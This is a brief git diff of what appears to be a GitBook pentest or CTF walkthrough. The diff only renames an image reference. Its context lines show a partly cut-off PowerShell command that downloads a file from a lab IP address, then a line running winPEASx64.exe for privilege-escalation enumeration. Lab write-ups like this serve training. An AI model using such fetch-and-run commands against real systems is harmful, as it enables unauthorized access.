@@ -128,7 +128,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.218.233
 winPEASx64.exe
 ```
 
-![](<../../.gitbook/assets/image (25) (1) (1).png>)
+![](<../../.gitbook/assets/image (25) (1) (1) (1).png>)
 
 <figure><img src="../../.gitbook/assets/image (19) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
